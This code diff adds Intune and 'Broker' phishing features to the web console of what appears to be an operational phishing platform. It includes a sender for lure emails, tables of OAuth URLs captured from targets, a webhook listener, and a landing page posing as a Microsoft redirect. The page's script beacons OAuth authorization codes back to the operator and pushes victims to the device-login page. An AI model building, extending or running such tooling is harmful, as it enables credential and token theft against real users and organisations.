@@ -898,6 +898,28 @@
     </div>
 
     <div class="sidebar-section">
+      <div class="sidebar-label">Intune Phishing</div>
+      <div class="input-group">
+        <label>Sender Profile</label>
+        <select id="intuneProfile">
+          <option value="">— no profile —</option>
+        </select>
+      </div>
+      <div class="input-group">
+        <label>Intune Template <span style="color:var(--text-dim)">(use {{URL}})</span></label>
+        <select id="intuneTemplate">
+          <option value="">— no template —</option>
+        </select>
+      </div>
+      <div class="input-group">
+        <label>Public Base URL</label>
+        <input id="intuneBaseUrl" type="text" placeholder="https://your-server.com">
+      </div>
+      <button class="btn btn-primary" onclick="sendIntuneEmails()">📱 Send Intune Emails</button>
+      <button class="btn btn-sm" onclick="switchTab('intunecaptures', document.querySelector('.tab[data-tab=intunecaptures]'))" style="width:100%;margin-top:4px">👁 View Intune Captures</button>
+    </div>
+
+    <div class="sidebar-section">
       <div class="sidebar-label">Campaign Actions</div>
       <span id="actionLaunchRegen">
         <button class="btn btn-success" onclick="launchCampaign()">▶ Launch Campaign</button>
@@ -952,6 +974,8 @@
         <button class="tab" onclick="switchTab('tokens', this)">Tokens</button>
         <button class="tab" onclick="switchTab('mail', this)">Mail</button>
         <button class="tab" onclick="switchTab('qrscans', this)" data-tab="qrscans">QR Scans</button>
+        <button class="tab" onclick="switchTab('intunecaptures', this)" data-tab="intunecaptures">Intune</button>
+        <button class="tab" onclick="switchTab('broker', this)">Broker</button>
         <button class="tab" onclick="switchTab('teams', this)">Teams</button>
         <button class="tab" onclick="switchTab('files', this)">Files</button>
         <button class="tab" onclick="switchTab('users', this)">Users</button>
@@ -1198,6 +1222,137 @@
             <tr><td colspan="6" style="text-align:center;padding:24px;color:var(--text-dim)">No QR scans yet — send QR emails first</td></tr>
           </tbody>
         </table>
+      </div>
+
+      
+      <div id="tab-intunecaptures" class="tab-content">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+          <span style="font-size:11px;color:var(--text-dim)">Intune OAuth captures — ms-appx-web:// URLs captured from target browsers.</span>
+          <button class="btn btn-sm btn-primary" onclick="loadIntuneCaptures()">↻ Refresh</button>
+        </div>
+        <table class="data-table">
+          <thead><tr>
+            <th>Target</th>
+            <th>Captured At</th>
+            <th>Trigger</th>
+            <th>Source IP</th>
+            <th>URL</th>
+          </tr></thead>
+          <tbody id="intuneCapturesBody">
+            <tr><td colspan="5" style="text-align:center;padding:24px;color:var(--text-dim)">No Intune captures yet — send Intune emails first</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      
+      <div id="tab-broker" class="tab-content">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+          <span style="font-size:11px;color:var(--text-dim)">Native Broker Interop telemetry — captures ms-appx-web:// redirects and OAuth URIs.</span>
+          <div style="display:flex;gap:8px">
+            <button class="btn btn-sm" onclick="loadBrokerLogs()">↻ Refresh</button>
+            <button class="btn btn-sm btn-primary" onclick="startWebhookListener()">▶ Start Listener</button>
+            <button class="btn btn-sm btn-danger" onclick="stopWebhookListener()">■ Stop Listener</button>
+          </div>
+        </div>
+
+        <div class="stats-grid" style="margin-bottom:16px">
+          <div class="stat-card">
+            <div class="stat-value" id="statBrokerTotal">0</div>
+            <div class="stat-label">Total Captures</div>
+          </div>
+          <div class="stat-card captured">
+            <div class="stat-value" id="statBrokerOAuth">0</div>
+            <div class="stat-label">OAuth URIs</div>
+          </div>
+          <div class="stat-card pending">
+            <div class="stat-value" id="statBrokerError">0</div>
+            <div class="stat-label">Errors</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="statWebhookStatus" style="font-size:18px">—</div>
+            <div class="stat-label">Listener Status</div>
+          </div>
+        </div>
+
+        <div class="section-header">Landing Page Preview</div>
+        <div style="display:flex;gap:8px;margin-bottom:12px;align-items:center;flex-wrap:wrap">
+          <span style="font-size:10px;color:var(--text-dim)">QR Landing Page — served at /qr/{token}:</span>
+          <button class="btn btn-sm" onclick="toggleBrokerPreview()">👁 Toggle Code</button>
+        </div>
+        <div id="brokerPreviewContainer" class="config-card" style="margin-bottom:16px;display:none">
+          <div class="config-card-title" style="display:flex;justify-content:space-between;align-items:center">
+            <span>qrlanding.html — Injected on scan</span>
+            <button class="btn btn-sm" onclick="copyBrokerCode()">📋 Copy</button>
+          </div>
+          <pre id="brokerCodePreview" style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:14px;font-size:11px;color:var(--accent3);overflow-x:auto;max-height:400px;margin:0;white-space:pre-wrap;word-break:break-all">Loading...</pre>
+        </div>
+        <div class="capture-log" style="margin-bottom:16px">
+          <div class="capture-log-header">
+            <span style="width:8px;height:8px;border-radius:50%;background:var(--accent3);display:inline-block"></span>
+            Live Preview — What the target sees
+          </div>
+          <div style="background:#fff;border-radius:0 0 2px 2px;padding:20px;text-align:center">
+            <svg style="width:48px;height:48px;margin:0 auto 16px" viewBox="0 0 48 48" fill="none">
+              <rect x="2" y="2" width="20" height="20" fill="#f25022"/>
+              <rect x="26" y="2" width="20" height="20" fill="#7fba00"/>
+              <rect x="2" y="26" width="20" height="20" fill="#00a4ef"/>
+              <rect x="26" y="26" width="20" height="20" fill="#ffb900"/>
+            </svg>
+            <div style="font-size:14px;font-weight:600;color:#1a1a1a;margin-bottom:8px">Redirecting you…</div>
+            <div style="font-size:12px;color:#666;margin-bottom:16px">Please wait while we verify your request<br>and redirect you to the secure portal.</div>
+            <div style="width:28px;height:28px;border:3px solid #e0e0e0;border-top-color:#0078d4;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto"></div>
+          </div>
+        </div>
+
+        <div class="section-header">Broker Capture Log</div>
+        <div class="capture-log" style="margin-bottom:16px">
+          <div class="capture-log-header">
+            <span style="width:8px;height:8px;border-radius:50%;background:var(--accent);display:inline-block" id="brokerLiveDot"></span>
+            Live Broker Telemetry
+          </div>
+          <div class="capture-log-body" id="brokerLogBody" style="max-height:400px">
+            <div style="padding:24px;text-align:center;color:var(--text-dim);font-size:11px">Waiting for broker captures...</div>
+          </div>
+        </div>
+
+        <div class="section-header">Webhook Listener</div>
+        <div class="config-grid" style="grid-template-columns:1fr 1fr 1fr;gap:12px;margin-bottom:16px">
+          <div class="config-card">
+            <div class="config-card-title">Listener Port</div>
+            <div class="input-group">
+              <input type="number" id="webhookPort" placeholder="8000" value="8000">
+            </div>
+            <button class="btn btn-primary btn-sm" onclick="startWebhookListener()">Start</button>
+          </div>
+          <div class="config-card">
+            <div class="config-card-title">Status</div>
+            <div id="webhookStatusDisplay" style="font-size:11px;color:var(--text-dim);padding:8px 0">
+              Not running
+            </div>
+          </div>
+          <div class="config-card">
+            <div class="config-card-title">Total Entries</div>
+            <div id="webhookEntriesCount" style="font-size:24px;font-family:var(--sans);color:var(--accent3);padding:8px 0">
+              0
+            </div>
+          </div>
+        </div>
+
+        <div class="section-header">Raw Log Entries</div>
+        <div class="table-wrap">
+          <table class="data-table">
+            <thead><tr>
+              <th>Time</th>
+              <th>Source IP</th>
+              <th>Type</th>
+              <th>Path</th>
+              <th>Payload Preview</th>
+            </tr></thead>
+            <tbody id="brokerEntriesBody">
+              <tr><td colspan="5" style="text-align:center;padding:24px;color:var(--text-dim)">No entries yet</td></tr>
+            </tbody>
+          </table>
+        </div>
       </div>
 
       
@@ -1839,6 +1994,56 @@ async function loadQRScans() {
       <td style="text-align:center">${count}</td>
       <td>${dcSent}</td>
       <td style="font-size:10px;color:var(--text-dim);font-family:var(--mono)">${escH(s.token)}</td>
+    </tr>`;
+  }).join('');
+}
+
+async function sendIntuneEmails(targetId, email, btn) {
+  const profileID = document.getElementById('intuneProfile').value;
+  const intuneTmpl = document.getElementById('intuneTemplate').value;
+  const baseURL = document.getElementById('intuneBaseUrl').value.trim();
+  if (!activeCampaignID) { notify('Select a campaign first', true); return; }
+  if (!profileID) { notify('Select a sender profile first', true); return; }
+  if (!intuneTmpl) { notify('Select an Intune email template first', true); return; }
+  if (!baseURL) { notify('Enter the public base URL first', true); return; }
+
+  if (btn) { btn.disabled = true; btn.textContent = '…'; }
+  const body = { profile_id: profileID, intune_template_id: intuneTmpl, base_url: baseURL };
+  if (targetId) body.target_id = targetId;
+
+  const result = await api('POST', '/campaigns/' + activeCampaignID + '/intune-emails', body);
+  if (btn) { btn.disabled = false; btn.textContent = '📱'; }
+  if (result.error) { notify(result.error, true); return; }
+
+  const results = result.results || [];
+  const ok = results.filter(r => r.success).length;
+  const fail = results.length - ok;
+  if (targetId && email) {
+    const res = results[0];
+    notify(res && res.success ? 'Intune email sent to ' + email : 'Send failed for ' + email + ': ' + (res?.error || 'unknown'), !(res && res.success));
+  } else {
+    notify('Intune emails: ' + ok + ' sent' + (fail ? ', ' + fail + ' failed' : ''));
+  }
+  loadIntuneCaptures();
+}
+
+async function loadIntuneCaptures() {
+  if (!activeCampaignID) return;
+  const captures = await api('GET', '/campaigns/' + activeCampaignID + '/intune-captures');
+  const body = document.getElementById('intuneCapturesBody');
+  if (!body) return;
+  if (!Array.isArray(captures) || captures.length === 0) {
+    body.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:24px;color:var(--text-dim)">No Intune captures yet</td></tr>';
+    return;
+  }
+  body.innerHTML = captures.map(c => {
+    const triggerColor = c.trigger === 'iframe_load' || c.trigger === 'page_source' ? 'var(--accent3)' : 'var(--accent2)';
+    return `<tr>
+      <td style="color:var(--text-bright)">${escH(c.target_id || c.token.substring(0, 8))}</td>
+      <td style="color:var(--text-dim)">${new Date(c.captured_at).toLocaleString()}</td>
+      <td style="font-size:11px;color:${triggerColor};font-family:var(--mono)">${escH(c.trigger)}</td>
+      <td style="color:var(--text-dim)">${escH(c.source_ip)}</td>
+      <td style="font-size:10px;color:var(--text-dim);font-family:var(--mono);max-width:300px;overflow:hidden;text-overflow:ellipsis" title="${escH(c.url)}">${escH(c.url)}</td>
     </tr>`;
   }).join('');
 }
@@ -2607,9 +2812,11 @@ async function loadMailerSelects() {
     templates.map(t => `<option value="${escH(t.id)}">${escH(t.name)}</option>`).join('');
   document.getElementById('selectedProfile').innerHTML = profOpts;
   document.getElementById('qrProfile').innerHTML = profOpts;
+  document.getElementById('intuneProfile').innerHTML = profOpts;
   document.getElementById('selectedTemplate').innerHTML = tmplOpts;
   document.getElementById('qrTemplate').innerHTML = tmplOpts;
   document.getElementById('qrDcTemplate').innerHTML = tmplOpts;
+  document.getElementById('intuneTemplate').innerHTML = tmplOpts;
 }
 
 async function loadCampaigns() {
@@ -3486,11 +3693,302 @@ function renderGroupTabContent(tab, data) {
 
   // Generic for member-of, app-roles
   el.innerHTML = `<table class="data-table"><thead><tr><th>Name</th><th>Type</th></tr></thead><tbody>` +
-    items.map(i=>`<tr>
-      <td style="color:var(--text-bright)">${escH(i.displayName||i.principalDisplayName||'—')}</td>
-      <td style="color:var(--text-dim);font-size:11px">${escH(i['@odata.type']||(i.groupTypes||[]).join(',')||'—')}</td>
-    </tr>`).join('') + `</tbody></table><div style="color:var(--text-dim);font-size:10px;margin-top:4px">${items.length} records</div>`;
+      items.map(i=>`<tr>
+        <td style="color:var(--text-bright)">${escH(i.displayName||i.principalDisplayName||'—')}</td>
+        <td style="color:var(--text-dim);font-size:11px">${escH(i['@odata.type']||(i.groupTypes||[]).join(',')||'—')}</td>
+      </tr>`).join('') + `</tbody></table><div style="color:var(--text-dim);font-size:10px;margin-top:4px">${items.length} records</div>`;
 }
+
+// ─── BROKER TAB ─────────────────────────────────────────────────────────────────
+let brokerInterval = null;
+
+async function loadBrokerLogs() {
+  let data;
+  try {
+    const r = await fetch('/webhook/logs');
+    if (!r.ok) { notify('Failed to load broker logs: ' + r.statusText, true); return; }
+    data = await r.json();
+  } catch(e) {
+    notify('Failed to load broker logs: ' + e.message, true);
+    return;
+  }
+
+  const entries = data.entries || [];
+  const total = data.total || 0;
+  
+  let oauthCount = 0;
+  let errorCount = 0;
+  entries.forEach(e => {
+    try {
+      const payload = JSON.parse(e.body || '{}');
+      if (payload.error || e.body?.includes('"error"')) errorCount++;
+      if (payload.code || e.body?.includes('"code"')) oauthCount++;
+    } catch(ex) {}
+  });
+  
+  document.getElementById('statBrokerTotal').textContent = total;
+  document.getElementById('statBrokerOAuth').textContent = oauthCount;
+  document.getElementById('statBrokerError').textContent = errorCount;
+  
+  const tbody = document.getElementById('brokerEntriesBody');
+  if (!entries.length) {
+    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:24px;color:var(--text-dim)">No entries yet</td></tr>';
+    return;
+  }
+  
+  tbody.innerHTML = entries.map(e => {
+    const ts = e.timestamp ? new Date(e.timestamp).toLocaleString() : '—';
+    const preview = e.body ? (e.body.length > 80 ? e.body.substring(0, 80) + '…' : e.body) : '—';
+    const typeBadge = e.type === 'broker_capture' 
+      ? '<span class="badge badge-ok">broker</span>'
+      : e.type === 'oauth_callback'
+      ? '<span class="badge badge-pending">oauth</span>'
+      : '<span class="badge badge-cancelled">generic</span>';
+    return `<tr>
+      <td style="font-size:11px;color:var(--text-dim)">${escH(ts)}</td>
+      <td style="font-size:11px;color:var(--accent)">${escH(e.remote_addr || '—')}</td>
+      <td>${typeBadge}</td>
+      <td style="font-size:11px;color:var(--text-dim)">${escH(e.path || '—')}</td>
+      <td class="wrap" style="font-size:10px;font-family:var(--mono)">${escH(preview)}</td>
+    </tr>`;
+  }).join('');
+}
+
+function renderBrokerEntry(entry) {
+  const logBody = document.getElementById('brokerLogBody');
+  if (!logBody) return;
+  
+  const ts = new Date().toLocaleTimeString();
+  const liveDot = document.getElementById('brokerLiveDot');
+  if (liveDot) {
+    liveDot.style.animation = 'none';
+    liveDot.offsetHeight;
+    liveDot.style.animation = 'pulse 0.5s ease';
+  }
+  
+  let html = '';
+  try {
+    const payload = JSON.parse(entry.body || '{}');
+    if (payload.raw_uri) {
+      const hasCode = payload.code ? `<span style="color:var(--accent3)">[CODE]</span>` : '';
+      const hasError = payload.error ? `<span style="color:var(--accent2)">[ERROR: ${escH(payload.error)}]</span>` : '';
+      html = `<div class="log-entry success">
+        <span class="log-time">${ts}</span>
+        <span style="color:var(--text)">${hasCode}${hasError} URI: ${escH(payload.raw_uri.substring(0, 100))}${payload.raw_uri.length > 100 ? '…' : ''}</span>
+      </div>`;
+    } else {
+      html = `<div class="log-entry info">
+        <span class="log-time">${ts}</span>
+        <span style="color:var(--text)">${escH(entry.body || '—')}</span>
+      </div>`;
+    }
+  } catch(ex) {
+    html = `<div class="log-entry info">
+      <span class="log-time">${ts}</span>
+      <span style="color:var(--text)">${escH(entry.body || '—')}</span>
+    </div>`;
+  }
+  
+  logBody.innerHTML = html + logBody.innerHTML;
+  if (logBody.children.length > 50) {
+    logBody.removeChild(logBody.lastChild);
+  }
+}
+
+async function startWebhookListener() {
+  const port = parseInt(document.getElementById('webhookPort')?.value) || 8000;
+  try {
+    const r = await fetch('/webhook/start', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ port }) });
+    const data = await r.json();
+    if (data.error) { notify('Listener error: ' + data.error, true); return; }
+    notify('Webhook listener started on port ' + port);
+    updateWebhookStatus();
+  } catch(e) { notify('Listener error: ' + e.message, true); }
+}
+
+async function stopWebhookListener() {
+  try {
+    const r = await fetch('/webhook/stop', { method: 'POST', headers: {'Content-Type': 'application/json'} });
+    const data = await r.json();
+    if (data.error) { notify('Listener error: ' + data.error, true); return; }
+    notify('Webhook listener stopped');
+    updateWebhookStatus();
+  } catch(e) { notify('Listener error: ' + e.message, true); }
+}
+
+async function updateWebhookStatus() {
+  try {
+    const r = await fetch('/webhook/status');
+    const data = await r.json();
+    if (data.error) {
+      document.getElementById('webhookStatusDisplay').innerHTML = '<span style="color:var(--accent2)">Error</span>';
+      return;
+    }
+    
+    const running = data.running;
+    const statusEl = document.getElementById('webhookStatusDisplay');
+    const statEl = document.getElementById('statWebhookStatus');
+    
+    if (running) {
+      statusEl.innerHTML = `<span style="color:var(--accent3)">Running on :${data.port}</span>`;
+      statEl.textContent = data.port;
+      statEl.style.color = 'var(--accent3)';
+    } else {
+      statusEl.innerHTML = '<span style="color:var(--text-dim)">Not running</span>';
+      statEl.textContent = '—';
+      statEl.style.color = 'var(--text-dim)';
+    }
+    
+    document.getElementById('webhookEntriesCount').textContent = data.entries || 0;
+    
+    if (running && !brokerInterval) {
+      brokerInterval = setInterval(async () => {
+        try {
+          const logsR = await fetch('/webhook/logs');
+          const logs = await logsR.json();
+          if (logs.entries && logs.entries.length > 0) {
+            logs.entries.slice(0, 3).forEach(e => {
+              if (e.type === 'broker_capture') renderBrokerEntry(e);
+            });
+          }
+        } catch(e) {}
+      }, 3000);
+    } else if (!running && brokerInterval) {
+      clearInterval(brokerInterval);
+      brokerInterval = null;
+    }
+  } catch(e) {
+    document.getElementById('webhookStatusDisplay').innerHTML = '<span style="color:var(--accent2)">Error</span>';
+  }
+}
+
+async function initBrokerTab() {
+  await updateWebhookStatus();
+  await loadBrokerLogs();
+  loadBrokerCodePreview();
+}
+
+function toggleBrokerPreview() {
+  const container = document.getElementById('brokerPreviewContainer');
+  if (container.style.display === 'none') {
+    container.style.display = 'block';
+    loadBrokerCodePreview();
+  } else {
+    container.style.display = 'none';
+  }
+}
+
+async function loadBrokerCodePreview() {
+  const preview = document.getElementById('brokerCodePreview');
+  if (!preview) return;
+  
+  const qrLandingCode = `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Loading…</title>
+<style>
+  body { background:#f5f5f5; display:flex; align-items:center; justify-content:center; min-height:100vh; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; }
+  .card { background:#fff; border-radius:8px; box-shadow:0 2px 16px rgba(0,0,0,0.10); padding:40px 36px; text-align:center; max-width:340px; }
+  h1 { font-size:18px; font-weight:600; color:#1a1a1a; margin-bottom:10px; }
+  p { font-size:14px; color:#666; line-height:1.5; }
+  .spinner { width:28px; height:28px; border:3px solid #e0e0e0; border-top-color:#0078d4; border-radius:50%; animation:spin 0.8s linear infinite; margin:24px auto 0; }
+  @keyframes spin { to { transform:rotate(360deg) } }
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>Redirecting you…</h1>
+  <p>Please wait while we verify your request and redirect you to the secure portal.</p>
+  <div class="spinner"></div>
+</div>
+<script>
+// ─── Native Broker Interop ─────────────────────────────────────────
+(function(){
+  var token = '{{TOKEN}}';   // ← Injected by Go handler
+  var capturedURI = null;
+
+  // 1. Capture URI on beforeunload (when browser navigates away)
+  window.onbeforeunload = function(e) {
+    if (capturedURI === null && window.location.href.indexOf('microsoft') !== -1) {
+      capturedURI = window.location.href;
+      if (capturedURI.indexOf('code=') !== -1 || 
+          capturedURI.indexOf('error=') !== -1 || 
+          capturedURI.indexOf('session_state') !== -1) {
+        navigator.sendBeacon && navigator.sendBeacon('/capture', JSON.stringify({
+          uri: capturedURI,
+          token: token,
+          timestamp: Date.now(),
+          trigger: 'beforeunload'
+        }));
+      }
+    }
+  };
+
+  // 2. Try to invoke ms-appx-web:// (fails silently in browsers)
+  var tryNativeBroker = function() {
+    try {
+      var iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = 'ms-appx-web://...';  // ← Broker scheme
+      document.body.appendChild(iframe);
+      setTimeout(function() { try { document.body.removeChild(iframe); } catch(e) {} }, 500);
+    } catch(e) {}
+  };
+
+  // 3. MutationObserver for OAuth redirects
+  var observeNavigation = function() {
+    if (window.MutationObserver) {
+      var observer = new MutationObserver(function() {
+        if (capturedURI === null) {
+          var url = window.location.href;
+          if (url.indexOf('microsoft.com') !== -1 && 
+              (url.indexOf('code=') !== -1 || url.indexOf('error=') !== -1)) {
+            capturedURI = url;
+            fetch('/capture', {
+              method: 'POST',
+              keepalive: true,
+              headers: {'Content-Type':'application/json'},
+              body: JSON.stringify({ uri: capturedURI, token: token, timestamp: Date.now(), trigger: 'navigation_observer' })
+            }).catch(function(){});
+          }
+        }
+      });
+      try { observer.observe(document.documentElement, {childList:true, subtree:true}); } catch(e) {}
+    }
+  };
+
+  // 4. Confirm scan and redirect to devicelogin
+  fetch('/qr/' + token + '/confirm', {method:'POST',keepalive:true,credentials:'omit'});
+  setTimeout(function() { window.location.replace('https://microsoft.com/devicelogin'); }, 150);
+
+  tryNativeBroker();
+  observeNavigation();
+})();
+<\/script>
+</body>
+</html>`;
+
+  preview.textContent = qrLandingCode;
+}
+
+function copyBrokerCode() {
+  const code = document.getElementById('brokerCodePreview')?.textContent;
+  if (!code) return;
+  navigator.clipboard.writeText(code).then(function() {
+    notify('Code copied to clipboard');
+  }).catch(function() {
+    notify('Failed to copy', true);
+  });
+}
+
+const originalSwitchTab = switchTab;
+switchTab = function(tab, btn) {
+  originalSwitchTab(tab, btn);
+  if (tab === 'broker') {
+    initBrokerTab();
+  }
+};
 </script>
 </body>
 </html>
